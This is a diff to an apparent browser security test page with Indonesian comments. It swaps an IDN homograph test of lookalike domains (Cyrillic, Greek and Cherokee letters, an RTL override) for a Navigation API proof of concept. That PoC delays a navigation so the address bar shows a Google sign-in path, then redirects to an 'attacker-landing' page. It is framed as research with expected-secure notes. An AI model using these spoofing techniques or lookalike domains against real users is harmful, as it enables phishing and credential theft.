@@ -1,27 +1,19 @@
-<!-- 20 | macOS/WebKit · kebijakan IDN Safari BERBEDA dari Chrome — di situ celahnya | [1-CLICK]
-     Chrome punya kebijakan 13-langkah whole-script-confusable yang sangat ketat; kalau
-     dilanggar ia jatuh ke punycode. WebKit memakai aturan yang BERBEDA (daftar skrip yang
-     diizinkan, bukan kebijakan campuran yang sama). Karena aturannya beda, HIMPUNAN string
-     yang lolos juga beda - dan string yang ditolak Chrome bisa lolos di Safari.
-     Ditambah fakta file 18: di Safari label domain adalah SATU-SATUNYA yang tampil.
-     Jadi satu label yang lolos filter IDN = seluruh atribusi yang dilihat pengguna.
-     Empat kelas diuji berdampingan; buka SEMUA di Safari DAN di Chrome, lalu bandingkan.
-     Yang dicari: string yang tampil apa adanya di satu mesin dan jadi "xn--" di mesin lain.
-     Perbedaan itu sendiri yang jadi laporan.
-     EXPECTED-SECURE  kedua mesin jatuh ke punycode untuk semua kelas ini. -->
-<pre id=g style="font:12px/1.7 monospace"></pre>
-<div id=b style="font:13px system-ui;line-height:2"></div>
+<!doctype html><meta charset=utf-8>
+<!-- PREDIKAT: bar melukis URL yang diminta selama penundaan, lalu mendarat di URL LAIN tanpa bar ikut jujur
+     ORACLE: klik go -> screenshot bar pada detik 1 (masih ditunda) dan setelah mendarat
+     CONTROL: hapus precommitHandler, sisakan navigate() saja
+     EXPECTED-SECURE: bar tak melukis tujuan sebelum commit, dan setelah redirect ia menyebut tujuan AKHIR
+     [UNVERIFIED] bentuk persis precommitHandler berubah antar-versi - baca error di console, jangan tebak -->
+<button onclick="go()">go</button>
+<pre id=p></pre>
 <script>
-var H = [
-  ['Cyrillic whole-script', 'аррӏе.com'],
-  ['Yunani campuran', 'gοοgle.com'],
-  ['Armenia ո/n', 'ոews.com'],
-  ['Cherokee Ꭺ/A', 'Ꭺpple.com'],
-  ['digit-lookalike', 'g00gle.com'],
-  ['RTL di subdomain', 'a‮bc.example.com']
-];
-g.textContent = 'REAL ORIGIN: ' + location.href + '\n\nBuka tiap tautan di Safari DAN Chrome, catat mana yang TIDAK jadi xn--.';
-b.innerHTML = H.map(function (h) {
-  return '<a href="https://' + h[1] + '/" target="_blank" rel="noopener">' + h[0] + ' &rarr; ' + h[1] + '</a><br>';
-}).join('');
+const SHOW = '/accounts.google.com/signin/identifier', LAND = '/attacker-landing', MS = 2500;
+function log(s){ p.textContent = 'REAL: ' + location.href + '\n' + s; }
+if (!self.navigation) log('Navigation API tidak ada = INERT (catat).');
+else navigation.addEventListener('navigate', e => { if (!e.canIntercept) return;
+  try { e.intercept({ precommitHandler: c => new Promise(r => setTimeout(() => { c.redirect(LAND); r(); }, MS)) }); }
+  catch (err) { log('intercept ditolak: ' + err.name + ' - ' + err.message); } });
+function go(){ try { navigation.navigate(SHOW); log('ditunda ' + MS + 'ms - LIHAT BAR SEKARANG'); }
+  catch (err) { log('navigate ditolak: ' + err.name); } }
+log('siap');
 </script>
